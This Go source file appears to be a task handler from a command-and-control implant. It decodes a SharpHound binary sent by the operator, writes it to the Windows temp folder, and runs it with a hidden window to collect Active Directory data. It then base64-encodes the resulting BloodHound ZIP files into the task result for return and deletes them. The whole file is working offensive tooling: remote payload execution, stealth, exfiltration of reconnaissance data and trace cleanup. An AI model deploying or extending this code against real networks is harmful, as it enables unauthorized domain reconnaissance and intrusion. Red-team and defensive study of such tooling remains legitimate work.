//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
)

func handleSharpHound(task Task, res *TaskResult) {
	if runtime.GOOS != "windows" {
		res.Error = "sharphound is Windows-only"
		return
	}

	if task.Data == "" {
		res.Error = "sharphound binary data is required"
		return
	}

	binary, err := base64.StdEncoding.DecodeString(task.Data)
	if err != nil {
		res.Error = fmt.Sprintf("base64 decode failed: %v", err)
		return
	}

	collectionMethod := task.Command
	if collectionMethod == "" {
		collectionMethod = "DCOnly"
	}

	tmpDir := os.Getenv("TEMP")
	if tmpDir == "" {
		tmpDir = os.TempDir()
	}

	binaryPath := filepath.Join(tmpDir, fmt.Sprintf("sh_%x.exe", time.Now().UnixNano()))
	if err := os.WriteFile(binaryPath, binary, 0600); err != nil {
		res.Error = fmt.Sprintf("write sharphound binary: %v", err)
		return
	}
	defer os.Remove(binaryPath)

	outputPrefix := filepath.Join(tmpDir, fmt.Sprintf("BH_%x", time.Now().UnixNano()))

	cmd := exec.Command(binaryPath, "-c", collectionMethod, "--NoSaveCache", "--OutputPrefix", outputPrefix)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	runErr := cmd.Run()

	var summary strings.Builder
	if stdout.Len() > 0 {
		summary.WriteString(strings.TrimSpace(stdout.String()))
	}
	if stderr.Len() > 0 {
		if summary.Len() > 0 {
			summary.WriteString("\n")
		}
		summary.WriteString("[stderr] " + strings.TrimSpace(stderr.String()))
	}
	if runErr != nil {
		summary.WriteString(fmt.Sprintf("\n[exit] %v", runErr))
	}

	var zipFiles []string
	entries, readErr := os.ReadDir(tmpDir)
	if readErr == nil {
		prefix := filepath.Base(outputPrefix)
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			if strings.HasPrefix(name, prefix) && strings.HasSuffix(strings.ToLower(name), ".zip") {
				zipFiles = append(zipFiles, filepath.Join(tmpDir, name))
			}
		}
		if len(zipFiles) == 0 {
			for _, e := range entries {
				if e.IsDir() {
					continue
				}
				name := e.Name()
				if strings.HasSuffix(strings.ToLower(name), ".zip") && strings.Contains(strings.ToLower(name), "bloodhound") {
					zipFiles = append(zipFiles, filepath.Join(tmpDir, name))
				}
			}
		}
	}

	type zipEntry struct {
		Name string `json:"name"`
		Size int64  `json:"size"`
		Data string `json:"data,omitempty"`
	}

	var totalSize int64
	for _, zf := range zipFiles {
		info, statErr := os.Stat(zf)
		if statErr != nil {
			continue
		}
		totalSize += info.Size()
	}

	maxInline := int64(20 * 1024 * 1024)

	var collected []zipEntry
	for _, zf := range zipFiles {
		data, readErr := os.ReadFile(zf)
		if readErr != nil {
			summary.WriteString(fmt.Sprintf("\n[!] failed to read %s: %v", filepath.Base(zf), readErr))
			continue
		}

		ze := zipEntry{
			Name: filepath.Base(zf),
			Size: int64(len(data)),
		}

		if totalSize <= maxInline {
			ze.Data = base64.StdEncoding.EncodeToString(data)
		}

		collected = append(collected, ze)
		os.Remove(zf)
	}

	summary.WriteString(fmt.Sprintf("\n[+] Collection method: %s", collectionMethod))
	summary.WriteString(fmt.Sprintf("\n[+] ZIP files: %d", len(collected)))

	if len(collected) > 0 && totalSize <= maxInline {
		jsonData, _ := json.Marshal(collected)
		res.Output = string(jsonData)
		res.Encoding = "bloodhound_zip"
	} else {
		res.Output = summary.String()
	}
}
